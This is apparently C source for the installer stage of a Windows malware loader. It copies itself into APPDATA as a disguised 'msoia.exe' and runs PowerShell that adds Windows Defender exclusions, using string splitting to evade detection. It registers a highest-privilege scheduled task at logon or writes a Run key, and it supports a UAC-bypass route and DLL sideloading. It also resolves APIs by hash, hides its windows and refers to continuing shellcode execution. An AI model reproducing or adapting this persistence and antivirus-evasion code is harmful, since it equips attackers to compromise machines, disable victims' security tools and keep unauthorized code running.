// =============================================
// Install.c  -  File copy + launch + self-terminate
//
// InstallAndTerminate  (all EXE builds):
//   1. Detect if already persistence copy (basename == msoia.exe) → return
//   2. GetEnvironmentVariableA("APPDATA") → build dest path
//   3. CreateDirectoryA for each intermediate level
//   [UAC only]
//     4. RunWdExclude: elevated PS → Add-MpPreference + Register-ScheduledTask
//     5. Sleep(8000): wait for PS exclusions
//   6. CopyFileA self → msoia.exe
//   [UAC only]
//     7. RunTaskViaCom → launch task immediately
//   [non-UAC]
//     7. CreateProcessW(msoia.exe) → launch directly
//   8. NtTerminateProcess(self)
//
// SideloadInstallAndContinue  (all BUILD_DLL builds):
//   1. Detect if persistence reboot (/pf in command line) → return
//   2. Build dest path + create dirs
//   3. CopyFileA host EXE → msoia.exe
//   4. CopyFileA *.dll → dest dir
//   [UAC only]
//     5. RunWdExclude + Sleep + RunTaskViaCom
//   [non-UAC]
//     5. CreateProcessW(msoia.exe /pf) → launch directly
//   6. NtTerminateProcess(self)
//
// AMSI note: copy done in C after PS sets exclusions (UAC builds) so AMSI
// in the PS child cannot block Copy-Item.
// =============================================

#include "Common.h"

// ---- ASCII helpers (no CRT) ----
static SIZE_T Ins_ALen(const CHAR* s) { SIZE_T n = 0; while (s[n]) n++; return n; }
static VOID Ins_ACpy(CHAR* dst, const CHAR* src, SIZE_T max) {
    SIZE_T i; for (i = 0; i < max-1 && src[i]; i++) dst[i]=src[i]; dst[i]=0;
}
static VOID Ins_ACat(CHAR* dst, const CHAR* src, SIZE_T max) {
    SIZE_T n=Ins_ALen(dst), i;
    for (i = 0; i < max-n-1 && src[i]; i++) dst[n+i]=src[i];
    dst[n+i]=0;
}

// ---- Typedefs (all builds) ----
typedef DWORD    (WINAPI* fnGetEnvVarA)(LPCSTR, LPSTR, DWORD);
typedef BOOL     (WINAPI* fnCreateDirA)(LPCSTR, LPSECURITY_ATTRIBUTES);
typedef BOOL     (WINAPI* fnCopyFileA3)(LPCSTR, LPCSTR, BOOL);
typedef DWORD    (WINAPI* fnGetModA)   (HMODULE, LPSTR, DWORD);
typedef VOID     (WINAPI* fnSleepA)   (DWORD);
typedef NTSTATUS (NTAPI*  fnNtTerm2)  (HANDLE, NTSTATUS);
typedef BOOL     (WINAPI* fnCreateProcW)(LPCWSTR, LPWSTR, PVOID, PVOID, BOOL, DWORD, PVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

// Find* typedefs needed by SideloadInstallAndContinue (all sideload builds)
#ifdef BUILD_DLL
typedef LPCSTR (WINAPI* fnGetCmdLineA)(VOID);
typedef HANDLE (WINAPI* fnFindFirstA) (LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI* fnFindNextA)  (HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI* fnFindCloseA) (HANDLE);
#endif

// =============================================
// UAC-only helper functions
// =============================================
#ifdef UAC_BYPASS


static VOID RunTaskViaCom(IN PAPI_HASHING pApi, IN LPCSTR szTaskName) {
    typedef struct { WORD vt; WORD r[3]; LONGLONG v; } CVAR;
    typedef HRESULT (WINAPI* fnCoInitEx)    (PVOID, DWORD);
    typedef HRESULT (WINAPI* fnCoCrInst)    (const GUID*, PVOID, DWORD, const GUID*, PVOID*);
    typedef BSTR    (WINAPI* fnSysAlloc)    (LPCWSTR);
    typedef void    (WINAPI* fnSysFree)     (BSTR);
    typedef ULONG   (__stdcall* fnRelease)  (void*);
    typedef HRESULT (__stdcall* fnConnect)  (void*, CVAR, CVAR, CVAR, CVAR);
    typedef HRESULT (__stdcall* fnGetFolder)(void*, BSTR, void**);
    typedef HRESULT (__stdcall* fnGetTask)  (void*, BSTR, void**);
    typedef HRESULT (__stdcall* fnRunTask)  (void*, CVAR, void**);

    HMODULE hOle32  = pApi->pLoadLibraryA("ole32.dll");
    HMODULE hOleAut = pApi->pLoadLibraryA("oleaut32.dll");
    if (!hOle32 || !hOleAut) { LOG("[!] RunTaskViaCom: load failed"); return; }

    fnCoInitEx pCoInit = (fnCoInitEx)pApi->pGetProcAddress(hOle32,  "CoInitializeEx");
    fnCoCrInst pCoCI   = (fnCoCrInst)pApi->pGetProcAddress(hOle32,  "CoCreateInstance");
    fnSysAlloc pSAS    = (fnSysAlloc)pApi->pGetProcAddress(hOleAut, "SysAllocString");
    fnSysFree  pSFS    = (fnSysFree) pApi->pGetProcAddress(hOleAut, "SysFreeString");
    if (!pCoInit || !pCoCI || !pSAS || !pSFS) { LOG("[!] RunTaskViaCom: API failed"); return; }

    pCoInit(NULL, 0);
    static const GUID CLSID_TS = {0x0f87369f,0xa4e5,0x4cfc,{0xbd,0x3e,0x73,0xe6,0x15,0x45,0x72,0xdd}};
    static const GUID IID_ITS  = {0x2faba4c7,0x4da9,0x4013,{0x96,0x97,0x20,0xcc,0x3f,0xd4,0x0f,0x85}};

    void* pSvc = NULL;
    if (FAILED(pCoCI(&CLSID_TS, NULL, 0x17, &IID_ITS, &pSvc)) || !pSvc) {
        LOG("[!] RunTaskViaCom: CoCreateInstance failed"); return;
    }

#define VT(obj,n) ((void**)*(void**)(obj))[(n)]
    CVAR vE; MemSet(&vE, 0, sizeof(vE));
    HRESULT hr;

    hr = ((fnConnect)VT(pSvc,10))(pSvc, vE, vE, vE, vE);
    if (FAILED(hr)) { goto rel_svc; }

    BSTR bRoot = pSAS(L"\\");
    void* pFolder = NULL;
    hr = ((fnGetFolder)VT(pSvc,7))(pSvc, bRoot, &pFolder);
    pSFS(bRoot);
    if (FAILED(hr) || !pFolder) { goto rel_svc; }

    WCHAR wName[128]; MemSet(wName, 0, sizeof(wName));
    for (SIZE_T i = 0; szTaskName[i] && i < 127; i++) wName[i] = (WCHAR)(UCHAR)szTaskName[i];

    BSTR bTask = pSAS(wName);
    void* pTask = NULL;
    hr = ((fnGetTask)VT(pFolder,13))(pFolder, bTask, &pTask);
    pSFS(bTask);
    if (FAILED(hr) || !pTask) { goto rel_folder; }

    ((fnRunTask)VT(pTask,12))(pTask, vE, NULL);
    ((fnRelease)VT(pTask,2))(pTask);

rel_folder:
    ((fnRelease)VT(pFolder,2))(pFolder);
rel_svc:
    ((fnRelease)VT(pSvc,2))(pSvc);
#undef VT
}

static VOID RunWdExclude(IN PAPI_HASHING pApi, IN PVOID pNtdll, IN PVOID pK32,
                         IN LPCSTR szDestDir, IN LPCSTR szDestExe) {
    static WCHAR wFinal[3200];
    SIZE_T fpos = 0;
    MemSet(wFinal, 0, sizeof(wFinal));

#define FA(s) do { const CHAR* _s=(const CHAR*)(s); for(SIZE_T _i=0; _s[_i] && fpos<3190; _i++) wFinal[fpos++]=(WCHAR)(UCHAR)_s[_i]; } while(0)
#define FW(w) do { const WCHAR* _w=(w); for(SIZE_T _i=0; _w[_i] && fpos<3190; _i++) wFinal[fpos++]=_w[_i]; } while(0)

    // Prefix: <sysdir>\cmd.exe /c  (already elevated as --install child)
    {
        typedef DWORD (WINAPI* fnGSD2)(LPWSTR, UINT);
        fnGSD2 pGSD = (fnGSD2)FetchExportAddress(pK32, GetSystemDirectoryW_JOAAT);
        WCHAR wSysDir[MAX_PATH] = {0};
        if (pGSD) { pGSD(wSysDir, MAX_PATH); for (SIZE_T _i = 0; wSysDir[_i] && fpos < 3190; _i++) wFinal[fpos++] = wSysDir[_i]; FW(L"\\cmd.exe /c "); }
        else { FW(L"cmd.exe /c "); }
    }

    // WD exclusions + task registration in one powershell -Command (no -EncodedCommand, avoids PSE74).
    // Register-ScheduledTask replaces schtasks to suppress default AC-power conditions.
    BYTE xPName[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPName);
    BYTE xValName[] = XSTR_STARTUP_VALUE_NAME; DEOBF(xValName);
    FW(L"powershell -Command \"$c='Add-'+'MpPref'+'erence';$h=@{ExclusionPath=@('");
    {
        CHAR szTmp[MAX_PATH]; Ins_ACpy(szTmp, szDestDir, MAX_PATH);
        SIZE_T dlen = Ins_ALen(szTmp); BOOL bFirst = TRUE;
        for (SIZE_T i = 1; i <= dlen; i++) {
            if (szTmp[i-1] == '\\') {
                if (!bFirst) { FW(L"','"); }
                for (SIZE_T k = 0; k < i && fpos < 3190; k++) wFinal[fpos++] = (WCHAR)(UCHAR)szTmp[k];
                bFirst = FALSE;
            }
        }
    }
    FW(L"','"); FA(szDestExe);
    FW(L"');ExclusionProcess=@('"); FA((CHAR*)xPName);
    FW(L"','explorer.exe','ctfmon.exe','taskhostw.exe','dllhost.exe')};&$c @h;");
    FW(L"$a=New-ScheduledTaskAction -Execute '"); FA(szDestExe); FW(L"';");
    FW(L"$t=New-ScheduledTaskTrigger -AtLogOn;");
    FW(L"$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;");
    FW(L"$p=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive;");
    FW(L"Register-ScheduledTask -TaskName '"); FA((CHAR*)xValName);
    FW(L"' -Action $a -Trigger $t -Settings $s -Principal $p -Force\"");

#undef FA
#undef FW
    wFinal[fpos] = 0;

    // Spawn cmd.exe directly — no AppInfo bypass needed, already elevated
    typedef BOOL (WINAPI* fnCPW2)(LPCWSTR, LPWSTR, PVOID, PVOID, BOOL, DWORD, PVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
    typedef BOOL (WINAPI* fnClH2)(HANDLE);
    fnCPW2 pCPW = (fnCPW2)FetchExportAddress(pK32, CreateProcessW_JOAAT);
    fnClH2 pClH = (fnClH2)FetchExportAddress(pK32, CloseHandle_JOAAT);
    if (!pCPW) { LOG("[!] RunWdExclude: CreateProcessW not found"); return; }
    STARTUPINFOW si = {0}; PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    LOG("[*] Install: launching WD excl + scheduled task via cmd.exe...");
    if (pCPW(NULL, wFinal, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        LOG("[+] RunWdExclude: cmd.exe spawned");
        if (pClH) { pClH(pi.hThread); pClH(pi.hProcess); }
    } else { LOG("[!] RunWdExclude: cmd.exe failed"); }
}

#endif /* UAC_BYPASS */

// =============================================
// InstallAndTerminate — all EXE builds
// =============================================
VOID InstallAndTerminate(IN PAPI_HASHING pApi) {
    PVOID pK32   = FindLoadedModuleW(L"KERNEL32.DLL");
    PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
    if (!pK32 || !pNtdll) return;

    BYTE xGetEnv[] = XSTR_GET_ENV_VAR_A;      DEOBF(xGetEnv);
    BYTE xMkDir[]  = XSTR_CREATE_DIRECTORY_A; DEOBF(xMkDir);
    BYTE xCpFile[] = XSTR_COPY_FILE_A;        DEOBF(xCpFile);
    fnGetEnvVarA   pGetEnv   = (fnGetEnvVarA)  pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xGetEnv);
    fnCreateDirA   pMkDir    = (fnCreateDirA)  pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xMkDir);
    fnCopyFileA3   pCpFile   = (fnCopyFileA3)  pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xCpFile);
    fnGetModA      pGetModA  = (fnGetModA)     FetchExportAddress(pK32,  GetModuleFileNameA_JOAAT);
    fnNtTerm2      pNtTerm   = (fnNtTerm2)     FetchExportAddress(pNtdll, NtTerminateProcess_JOAAT);
    fnCreateProcW  pCrProcW  = (fnCreateProcW) FetchExportAddress(pK32,  CreateProcessW_JOAAT);
#ifdef UAC_BYPASS
    fnSleepA       pSleep    = (fnSleepA)      FetchExportAddress(pK32,  Sleep_JOAAT);
#endif

    if (!pGetEnv || !pMkDir || !pCpFile || !pGetModA || !pNtTerm) {
        LOG("[!] Install: API resolution failed");
        return;
    }

    // 1. Get APPDATA
    CHAR szAppData[MAX_PATH] = {0};
    BYTE xAppData[] = XSTR_APPDATA_VAR; DEOBF(xAppData);
    if (!pGetEnv((LPCSTR)xAppData, szAppData, MAX_PATH)) {
        LOG("[!] Install: GetEnvironmentVariableA(APPDATA) failed");
        return;
    }

    // 2. Build dest dir
    CHAR szDestDir[MAX_PATH] = {0};
    Ins_ACpy(szDestDir, szAppData, MAX_PATH);
    {
        BYTE xSubDir[] = XSTR_INSTALL_SUBDIR; DEOBF(xSubDir);
        SIZE_T base = Ins_ALen(szDestDir);
        for (SIZE_T i = 0; xSubDir[i]; i++) {
            szDestDir[base + i]     = xSubDir[i];
            szDestDir[base + i + 1] = '\0';
            if (xSubDir[i] == '\\') pMkDir(szDestDir, NULL);
        }
    }
    LOG("[+] Install: directory tree ensured");

    // 3. Build dest EXE path
    CHAR szDestExe[MAX_PATH] = {0};
    Ins_ACpy(szDestExe, szDestDir, MAX_PATH);
    BYTE xPName[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPName);
    Ins_ACat(szDestExe, (CHAR*)xPName, MAX_PATH);

    // 4. Get source EXE path
    CHAR szSrcExe[MAX_PATH] = {0};
    if (!pGetModA(NULL, szSrcExe, MAX_PATH)) {
        LOG("[!] Install: GetModuleFileNameA failed");
        return;
    }

    // 5. Self-guard: if already the persistence copy (same check as UAC's IsFirstRunProcess),
    //    skip install and return to continue shellcode execution.
    {
        SIZE_T len = Ins_ALen(szSrcExe);
        SIZE_T lastSep = 0;
        for (SIZE_T i = 0; i < len; i++) if (szSrcExe[i] == '\\') lastSep = i;
        CHAR* szBase = szSrcExe + lastSep + 1;
        BYTE xPN2[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPN2);
        SIZE_T pi;
        for (pi = 0; xPN2[pi] && szBase[pi]; pi++) {
            CHAR a = xPN2[pi], b = szBase[pi];
            if (a >= 'A' && a <= 'Z') a += 32;
            if (b >= 'A' && b <= 'Z') b += 32;
            if (a != b) break;
        }
        if (!xPN2[pi] && !szBase[pi]) {
            LOG("[*] Install: already persistence copy, skipping");
            return;
        }
    }

#ifdef UAC_BYPASS
    RunWdExclude(pApi, pNtdll, pK32, szDestDir, szDestExe);
    if (pSleep) pSleep(8000);
#endif

    // 6. Copy EXE
    if (!pCpFile(szSrcExe, szDestExe, FALSE)) {
        LOG_HEX("[!] Install: CopyFileA failed, GLE=", GetLastError());
    } else {
        LOG("[+] Install: EXE copied to persistence path");
    }

#ifdef UAC_BYPASS
    // 7a. [UAC] Launch via scheduled task (RunLevel Highest — already registered in PS)
    {
        BYTE xVNt[] = XSTR_STARTUP_VALUE_NAME; DEOBF(xVNt);
        RunTaskViaCom(pApi, (LPCSTR)xVNt);
    }
#else
    // 7b. [non-UAC] Write HKCU run key, then launch the copied EXE directly at same IL
    InstallPersistence(pApi);
    if (pCrProcW) {
        WCHAR wDestExe[MAX_PATH] = {0};
        for (SIZE_T i = 0; szDestExe[i] && i < MAX_PATH-1; i++)
            wDestExe[i] = (WCHAR)(UCHAR)szDestExe[i];
        STARTUPINFOW si = {0}; si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {0};
        pCrProcW(wDestExe, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        LOG("[+] Install: launched persistence copy");
    }
#endif

    // 8. Terminate self
    LOG("[*] Install: terminating");
    pNtTerm((HANDLE)(ULONG_PTR)-1, 0);
}

// =============================================
// SideloadInstallAndContinue — all BUILD_DLL builds
// =============================================
#ifdef BUILD_DLL

VOID SideloadInstallAndContinue(IN PAPI_HASHING pApi) {
    static WIN32_FIND_DATAA s_wfd;
    static CHAR  s_szSrcDll[MAX_PATH];
    static CHAR  s_szDstDll[MAX_PATH];
    static CHAR  s_szPattern[MAX_PATH];
#ifdef UAC_BYPASS
    static WCHAR wFinal[5700];
#endif

    PVOID pK32   = FindLoadedModuleW(L"KERNEL32.DLL");
    PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
    if (!pK32 || !pNtdll) return;

    BYTE xGetEnv[] = XSTR_GET_ENV_VAR_A;      DEOBF(xGetEnv);
    BYTE xMkDir[]  = XSTR_CREATE_DIRECTORY_A; DEOBF(xMkDir);
    BYTE xCpFile[] = XSTR_COPY_FILE_A;        DEOBF(xCpFile);

    fnGetEnvVarA  pGetEnv   = (fnGetEnvVarA) pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xGetEnv);
    fnCreateDirA  pMkDir    = (fnCreateDirA) pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xMkDir);
    fnCopyFileA3  pCpFile   = (fnCopyFileA3) pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xCpFile);
    fnGetModA     pGetModA  = (fnGetModA)    FetchExportAddress(pK32,   GetModuleFileNameA_JOAAT);
    fnFindFirstA  pFFF      = (fnFindFirstA) FetchExportAddress(pK32,   FindFirstFileA_JOAAT);
    fnFindNextA   pFNF      = (fnFindNextA)  FetchExportAddress(pK32,   FindNextFileA_JOAAT);
    fnFindCloseA  pFC       = (fnFindCloseA) FetchExportAddress(pK32,   FindClose_JOAAT);
    fnNtTerm2     pNtTerm   = (fnNtTerm2)    FetchExportAddress(pNtdll, NtTerminateProcess_JOAAT);
    fnGetCmdLineA pGetCmdA  = (fnGetCmdLineA)FetchExportAddress(pK32,   GetCommandLineA_JOAAT);
    fnCreateProcW pCrProcW  = (fnCreateProcW)FetchExportAddress(pK32,   CreateProcessW_JOAAT);
#ifdef UAC_BYPASS
    fnSleepA      pSleep    = (fnSleepA)     FetchExportAddress(pK32,   Sleep_JOAAT);
    typedef DWORD (WINAPI* fnGSD2)(LPWSTR, UINT);
    typedef DWORD (WINAPI* fnGWD2)(LPWSTR, UINT);
    fnGSD2 pGSD = (fnGSD2)FetchExportAddress(pK32, GetSystemDirectoryW_JOAAT);
    fnGWD2 pGWD = (fnGWD2)FetchExportAddress(pK32, GetWindowsDirectoryW_JOAAT);
    if (!pGSD || !pGWD) return;
#endif

    if (!pGetEnv || !pMkDir || !pCpFile || !pGetModA || !pFFF || !pFNF || !pFC || !pNtTerm) {
        LOG("[!] SideloadInstall: API resolution failed");
        return;
    }

    // 1. Self-guard: detect persistence reboot via /pf in command line
    //    (same mechanism as bPersistBoot in Sideload.c for UAC builds)
    if (pGetCmdA) {
        LPCSTR szCmd = pGetCmdA();
        if (szCmd) {
            for (SIZE_T i = 0; szCmd[i]; i++) {
                if (szCmd[i] == '/' && szCmd[i+1] == 'p' && szCmd[i+2] == 'f') {
                    LOG("[*] SideloadInstall: persistence reboot (/pf), skipping");
                    return;
                }
            }
        }
    }

    // 2. APPDATA
    CHAR szAppData[MAX_PATH] = {0};
    BYTE xAppData[] = XSTR_APPDATA_VAR; DEOBF(xAppData);
    if (!pGetEnv((LPCSTR)xAppData, szAppData, MAX_PATH)) return;

    // 3. Build dest dir
    CHAR szDestDir[MAX_PATH] = {0};
    Ins_ACpy(szDestDir, szAppData, MAX_PATH);
    {
        BYTE xSubDir[] = XSTR_INSTALL_SUBDIR; DEOBF(xSubDir);
        SIZE_T base = Ins_ALen(szDestDir);
        for (SIZE_T i = 0; xSubDir[i]; i++) {
            szDestDir[base + i]     = xSubDir[i];
            szDestDir[base + i + 1] = '\0';
            if (xSubDir[i] == '\\') pMkDir(szDestDir, NULL);
        }
    }

    // 4. Get host EXE path + derive source dir
    CHAR szSrcExe[MAX_PATH] = {0};
    if (!pGetModA(NULL, szSrcExe, MAX_PATH)) return;

    SIZE_T exeLen = Ins_ALen(szSrcExe);
    SIZE_T lastSep = 0;
    for (SIZE_T i = 0; i < exeLen; i++) if (szSrcExe[i] == '\\') lastSep = i;
    CHAR szSrcDir[MAX_PATH] = {0};
    MemCopy(szSrcDir, szSrcExe, lastSep + 1);

    // 5. Build dest EXE path
    CHAR szDestExe[MAX_PATH] = {0};
    Ins_ACpy(szDestExe, szDestDir, MAX_PATH);
    BYTE xPName2[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPName2);
    Ins_ACat(szDestExe, (CHAR*)xPName2, MAX_PATH);

#ifdef UAC_BYPASS
    // 6a. [UAC] WD exclusions + scheduled task (with /pf argument) via elevated PS
    {
        // Build cmd.exe chain directly into wFinal — no PowerShell needed
        SIZE_T fpos = 0;
        MemSet(wFinal, 0, sizeof(wFinal));
#define SLA(s) do { const CHAR* _s=(const CHAR*)(s); for(SIZE_T _i=0; _s[_i] && fpos<5690; _i++) wFinal[fpos++]=(WCHAR)(UCHAR)_s[_i]; } while(0)
#define SLW(w) do { const WCHAR* _w=(w); for(SIZE_T _i=0; _w[_i] && fpos<5690; _i++) wFinal[fpos++]=_w[_i]; } while(0)
        // Prefix: <sysdir>\cmd.exe /c
        {
            WCHAR wSD[MAX_PATH] = {0};
            if (pGSD) { pGSD(wSD, MAX_PATH); for (SIZE_T _i = 0; wSD[_i] && fpos < 5690; _i++) wFinal[fpos++] = wSD[_i]; SLW(L"\\cmd.exe /c "); }
            else { SLW(L"cmd.exe /c "); }
        }
        // WD exclusions + task registration in one powershell -Command (no -EncodedCommand, avoids PSE74).
        // Register-ScheduledTask replaces schtasks to suppress default AC-power conditions.
        { BYTE xPN3[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPN3);
          BYTE xVN[]  = XSTR_STARTUP_VALUE_NAME; DEOBF(xVN);
          SLW(L"powershell -Command \"$c='Add-'+'MpPref'+'erence';$h=@{ExclusionPath=@('");
          {
              CHAR szTmp[MAX_PATH]; Ins_ACpy(szTmp, szDestDir, MAX_PATH);
              SIZE_T dlen = Ins_ALen(szTmp); BOOL bFirst = TRUE;
              for (SIZE_T i = 1; i <= dlen; i++) {
                  if (szTmp[i-1] == '\\') {
                      if (!bFirst) { SLW(L"','"); }
                      for (SIZE_T k = 0; k < i && fpos < 5690; k++) wFinal[fpos++] = (WCHAR)(UCHAR)szTmp[k];
                      bFirst = FALSE;
                  }
              }
          }
          SLW(L"','"); SLA(szDestExe);
          SLW(L"');ExclusionProcess=@('"); SLA((CHAR*)xPN3);
          SLW(L"','explorer.exe','ctfmon.exe','taskhostw.exe','dllhost.exe')};&$c @h;");
          SLW(L"$a=New-ScheduledTaskAction -Execute '"); SLA(szDestExe); SLW(L"' -Argument '/pf';");
          SLW(L"$t=New-ScheduledTaskTrigger -AtLogOn;");
          SLW(L"$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;");
          SLW(L"$p=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive;");
          SLW(L"Register-ScheduledTask -TaskName '"); SLA((CHAR*)xVN);
          SLW(L"' -Action $a -Trigger $t -Settings $s -Principal $p -Force\""); }
#undef SLA
#undef SLW
        wFinal[fpos] = 0;
        WCHAR wSysDir[MAX_PATH] = {0};
        WCHAR wWinDir[MAX_PATH] = {0};
        pGSD(wSysDir, MAX_PATH); pGWD(wWinDir, MAX_PATH);
        LOG("[*] SideloadInstall: launching WD excl + scheduled task via AppInfo...");
        UacRunCommandElevated(pApi, pNtdll, wSysDir, wWinDir, wFinal);
    }
    if (pSleep) pSleep(8000);
#endif /* UAC_BYPASS */

    // 7. Copy host EXE
    if (!pCpFile(szSrcExe, szDestExe, FALSE)) {
        LOG("[!] SideloadInstall: CopyFileA (EXE) failed");
    } else {
        LOG("[+] SideloadInstall: EXE copied");
    }

    // 8. Copy all *.dll from source dir
    Ins_ACpy(s_szPattern, szSrcDir, MAX_PATH);
    { const CHAR szGlob[] = {'*','.','d','l','l',0}; Ins_ACat(s_szPattern, szGlob, MAX_PATH); }
    MemSet(&s_wfd, 0, sizeof(s_wfd));
    HANDLE hFind = pFFF(s_szPattern, &s_wfd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(s_wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                Ins_ACpy(s_szSrcDll, szSrcDir, MAX_PATH);
                Ins_ACat(s_szSrcDll, s_wfd.cFileName, MAX_PATH);
                Ins_ACpy(s_szDstDll, szDestDir, MAX_PATH);
                Ins_ACat(s_szDstDll, s_wfd.cFileName, MAX_PATH);
                pCpFile(s_szSrcDll, s_szDstDll, FALSE);
            }
        } while (pFNF(hFind, &s_wfd));
        pFC(hFind);
        LOG("[+] SideloadInstall: DLLs copied");
    }

#ifdef UAC_BYPASS
    // 9a. [UAC] Launch via scheduled task
    {
        BYTE xVNs[] = XSTR_STARTUP_VALUE_NAME; DEOBF(xVNs);
        RunTaskViaCom(pApi, (LPCSTR)xVNs);
        LOG("[+] SideloadInstall: COM task launch requested");
    }
#else
    // 9b. [non-UAC] Write HKCU run key, then launch copied EXE with /pf flag
    InstallPersistence(pApi);
    if (pCrProcW) {
        WCHAR wCmdLine[MAX_PATH + 8] = {0};
        SIZE_T ci = 0;
        wCmdLine[ci++] = L'"';
        for (SIZE_T i = 0; szDestExe[i] && ci < MAX_PATH+1; i++)
            wCmdLine[ci++] = (WCHAR)(UCHAR)szDestExe[i];
        wCmdLine[ci++] = L'"';
        wCmdLine[ci++] = L' '; wCmdLine[ci++] = L'/';
        wCmdLine[ci++] = L'p'; wCmdLine[ci++] = L'f';
        wCmdLine[ci]   = 0;
        STARTUPINFOW si = {0}; si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {0};
        pCrProcW(NULL, wCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        LOG("[+] SideloadInstall: launched persistence copy /pf");
    }
#endif

    // 10. Terminate self
    LOG("[*] SideloadInstall: terminating");
    pNtTerm((HANDLE)(ULONG_PTR)-1, 0);
}

#endif /* BUILD_DLL */
